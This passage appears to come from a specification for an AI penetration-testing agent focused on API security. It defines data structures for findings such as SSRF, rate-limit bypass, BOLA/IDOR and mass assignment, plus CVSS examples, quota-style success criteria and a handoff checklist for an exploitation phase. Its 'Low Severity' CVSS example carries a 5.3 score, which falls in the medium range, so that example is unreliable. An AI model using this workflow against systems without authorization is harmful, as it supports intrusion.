  parameter_name: string;

  access_achieved: {
    cloud_metadata: boolean; // AWS/Azure/GCP metadata
    internal_network: boolean;
    local_file_system: boolean;
    internal_services: string[]; // e.g., ["redis", "elasticsearch"]
  };

  exploitation: {
    payload_used: string;
    http_request: string;
    response_snippet: string;
    sensitive_data_exposed: string[];
  };

  impact_severity: 'critical' | 'high' | 'medium' | 'low';
}

// 9. Rate Limiting Bypass
interface RateLimitingBypass {
  endpoint: string;
  legitimate_limit: string; // e.g., "100 requests/minute"

  bypass_techniques: Array<{
    technique: 'ip_rotation' | 'header_manipulation' | 'cookie_evasion' |
               'distributed_pattern' | 'reset_timing';
    successful: boolean;
    requests_achieved: number;
    method_details: string;
  }>;

  impact: {
    resource_exhaustion_possible: boolean;
    account_enumeration_enabled: boolean;
    brute_force_feasible: boolean;
  };
}

// 10. API Endpoint Inventory
interface APIEndpointInventory {
  total_endpoints: number;

  endpoints: Array<{
    endpoint_id: string;
    url: string;
    api_type: 'REST' | 'GraphQL' | 'SOAP' | 'WebSocket';
    http_method: string;
    authentication_required: boolean;
    authorization_enforced: boolean;
    documented: boolean;
    deprecated: boolean;
    api_version: string;
    vulnerabilities_found: number;
    risk_level: 'critical' | 'high' | 'medium' | 'low' | 'none';
  }>;

  statistics: {
    documented_apis: number;
    undocumented_apis: number; // Shadow APIs
    deprecated_still_active: number;
    unauthenticated_apis: number;
    public_facing_apis: number;
  };
}

// 11. BOLA/IDOR Test Result
interface BOLATestResult {
  endpoint: string;
  object_type: string; // e.g., "user", "order", "document"
  id_parameter: string; // e.g., "user_id", "order_id"

  test_results: {
    total_ids_tested: number;
    successful_unauthorized_access: number;
    accessible_objects: Array<{
      object_id: string;
      owner: string;
      accessed_by: string; // Unauthorized user
      data_exposed: string[];
    }>;
  };

  vulnerability_confirmed: boolean;
  severity: 'critical' | 'high' | 'medium' | 'low';
  cvss_score: number;
}

// 12. Mass Assignment Test Result
interface MassAssignmentTestResult {
  endpoint: string;
  http_method: 'PUT' | 'PATCH' | 'POST';

  injectable_properties: Array<{
    property_name: string;
    expected_access: 'read_only' | 'admin_only' | 'forbidden';
    injection_successful: boolean;
    proof_of_concept: {
      request_payload: string;
      response: string;
      property_modified: boolean;
    };
  }>;

  privilege_escalation_achieved: boolean;
  impact: string;
}

// 13. Phase 2 Handoff Structure
interface Phase2HandoffData {
  source_phase: '1.2';
  target_phase: '2.0';
  handoff_timestamp: string;

  exploitable_vulnerabilities: Array<{
    vulnerability_id: string;
    title: string;
    owasp_category: string;
    severity: 'critical' | 'high';
    cvss_score: number;

    exploitation_details: {
      difficulty: 'easy' | 'medium' | 'hard';
      attack_vector: 'network' | 'adjacent_network' | 'local' | 'physical';
      privileges_required: 'none' | 'low' | 'high';
      user_interaction: 'none' | 'required';
      scope: 'unchanged' | 'changed';
    };

    prerequisites: string[];
    recommended_tools: string[];
    exploitation_notes: string;
  }>;

  validation: {
    minimum_targets_met: boolean; // >= 3 exploitable targets
    cvss_scored: boolean;
    poc_available: boolean;
    phase2_approved: boolean;
  };
}

// 14. Testing Metrics
interface APISecurityTestingMetrics {
  phase: '1.2';
  agent: 'api-security-tester';

  time_metrics: {
    total_duration_seconds: number;
    discovery_time: number;
    authentication_testing_time: number;
    authorization_testing_time: number;
    business_logic_testing_time: number;
    input_validation_testing_time: number;
    configuration_testing_time: number;
    reporting_time: number;
  };

  coverage_metrics: {
    owasp_categories_tested: number; // Target: 10
    owasp_coverage_percentage: number; // Target: 100%
    endpoints_tested: number;
    endpoints_vulnerable: number;
    vulnerability_detection_rate: number; // percentage
  };

  quality_metrics: {
    false_positive_count: number;
    false_positive_rate: number;
    confirmed_vulnerabilities: number;
    poc_validation_rate: number;
  };

  tool_usage: {
    automated_tools: string[];
    manual_testing_percentage: number;
    custom_scripts_used: number;
  };
}

// 15. Success Criteria Validation
interface SuccessCriteriaValidation {
  phase: '1.2';
  timestamp: string;

  criteria: {
    owasp_coverage: {
      target: 100; // 100% coverage
      actual: number;
      met: boolean;
    };
    exploitable_targets: {
      target: 3; // Minimum 3 targets
      actual: number;
      met: boolean;
    };
    critical_high_findings: {
      target: 1; // At least 1 critical/high finding
      actual: number;
      met: boolean;
    };
    poc_validation: {
      target: 100; // 100% of findings validated
      actual: number; // percentage
      met: boolean;
    };
    cvss_scoring: {
      target: 100; // 100% of findings scored
      actual: number; // percentage
      met: boolean;
    };
    phase2_handoff_ready: {
      target: true;
      actual: boolean;
      met: boolean;
    };
  };

  overall_success: boolean;
  blockers: string[]; // Reasons if not successful
  recommendations: string[];
}
```

---

## CVSS Scoring Examples

### Critical Severity (9.0-10.0)
**Vulnerability**: Unauthenticated BOLA allowing full account takeover
**CVSS Vector**: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`
**Score**: 10.0

### High Severity (7.0-8.9)
**Vulnerability**: JWT algorithm confusion enabling privilege escalation
**CVSS Vector**: `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N`
**Score**: 8.1

### Medium Severity (4.0-6.9)
**Vulnerability**: CORS misconfiguration with credentials exposure
**CVSS Vector**: `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N`
**Score**: 5.4

### Low Severity (0.1-3.9)
**Vulnerability**: Verbose error messages disclosing version information
**CVSS Vector**: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`
**Score**: 5.3

---

## Success Metrics and Handoff Validation

### Phase 1.2 Success Criteria
```yaml
success_criteria:
  owasp_coverage:
    description: "All 10 OWASP API Security categories tested"
    target: 100%
    validation: "categories_tested == 10"

  endpoint_coverage:
    description: "All discovered API endpoints tested"
    target: 100%
    validation: "endpoints_tested / total_endpoints >= 1.0"

  vulnerability_detection:
    description: "Minimum exploitable vulnerabilities identified"
    target: ">= 3 critical/high severity findings"
    validation: "critical_count + high_count >= 3"

  proof_of_concept:
    description: "All findings validated with working PoC"
    target: 100%
    validation: "poc_validated / total_findings >= 1.0"

  cvss_scoring:
    description: "All vulnerabilities scored with CVSS 3.1"
    target: 100%
    validation: "cvss_scored / total_findings >= 1.0"

  false_positive_rate:
    description: "Low false positive rate maintained"
    target: "< 20%"
    validation: "false_positives / total_findings < 0.20"

  phase2_handoff:
    description: "Phase 2 exploitation targets prepared"
    target: "Handoff package ready"
    validation: |
      - exploitable_targets.json exists
      - Minimum 3 targets with exploitation_difficulty != 'impossible'
      - All targets have CVSS >= 7.0
      - Prerequisite tools and access documented
```

### Phase 1.2 â†’ Phase 2 Handoff Checklist
```markdown
## Handoff Validation Checklist

### Documentation Complete
- [x] 01_vulnerability_analysis/02_api_security_testing.md generated
- [x] All OWASP API Top 10 categories documented
- [x] Vulnerability details include PoC and remediation
- [x] CVSS scores calculated for all findings

### Exploitable Targets Identified
- [x] Minimum 3 critical/high severity vulnerabilities confirmed
- [x] Exploitation difficulty assessed (easy/medium/hard)
- [x] Attack prerequisites documented
- [x] Recommended exploitation tools listed

### Memory State Synchronized
- [x] Memory key "pentest/phase1.2/complete-report" written
- [x] Memory key "pentest/handoff/phase1.2-to-phase2" written
- [x] Exploitable targets JSON stored in memory
- [x] API endpoint inventory synchronized

### Quality Assurance
- [x] All findings validated (no false positives in critical/high)
- [x] HTTP requests/responses captured for each finding
- [x] Screenshots or proof evidence attached
- [x] Remediation recommendations provided

### Phase 2 Prerequisites
- [x] Authentication tokens/credentials available for exploitation
- [x] Exploitation environment details documented
- [x] Network access requirements specified
- [x] Legal authorization confirmed for Phase 2

### Coordination
- [x] Post-task hooks executed successfully
- [x] Session metrics exported
- [x] Exploitation team notified
- [x] Phase 2 agent dependencies met
```

---

## Integration with DPTF (Dynamic Penetration Testing Framework)

### Phase Dependencies
```yaml
dptf_integration:
  current_phase: "1.2"
  phase_name: "API Security Testing"
  wave: 2

  dependencies:
    required:
      - phase: "0.1"
        name: "Passive Reconnaissance"
        memory_keys:
          - "pentest/phase0.1/findings"
          - "pentest/phase0.1/subdomains"

      - phase: "0.2"
        name: "Active Reconnaissance"
        memory_keys:
          - "pentest/phase0.2/api-endpoints"
          - "pentest/phase0.2/swagger-specs"
          - "pentest/phase0.2/technologies"

    optional:
      - phase: "1.1"
        name: "Web Application Security Testing"
        memory_keys:
          - "pentest/phase1.1/web-api-findings"

  parallel_execution:
    wave: 2
    concurrent_agents:
      - "web-application-security-tester" # Phase 1.1
      - "api-security-tester" # Phase 1.2 (this agent)
      - "network-security-tester" # Phase 1.3
      - "cloud-infrastructure-security-tester" # Phase 1.4
      - "container-orchestration-security-tester" # Phase 1.5

  outputs:
    phase2_inputs:
      - memory_key: "pentest/handoff/phase1.2-to-phase2"
        description: "Exploitable API vulnerabilities for Phase 2"
        format: "JSON array of exploitation targets"

      - memory_key: "pentest/phase1.2/complete-report"
        description: "Full API security testing report"
        format: "Markdown document"
```

---

## Version History

- **v2.0.0** (2025-11-11): Enhanced specification with comprehensive capabilities, hooks, methodology, TypeScript interfaces, and DPTF alignment
  - Added 20 detailed vulnerability testing capabilities
  - Integrated memory coordination hooks (pre/during/post)
  - Created comprehensive YAML workflow (9 phases, 40+ steps)
  - Defined 15 TypeScript interfaces for type-safe data structures
  - Added CVSS scoring examples and success metrics
  - Documented Phase 1.2 â†’ Phase 2 handoff process
  - Aligned with DPTF Wave 2 parallel execution model

- **v1.0.0** (2025-11-09): Initial API security tester agent
  - OWASP API Security Top 10 (2023) coverage
  - REST, GraphQL, SOAP, WebSocket testing
  - Basic hooks and reporting structure

---

**Agent Status**: Enhanced and ready for Wave 2 deployment
**Last Updated**: 2025-11-11
**Maintainer**: Penetration Testing Framework Team
**Contact**: security-team@organization.local
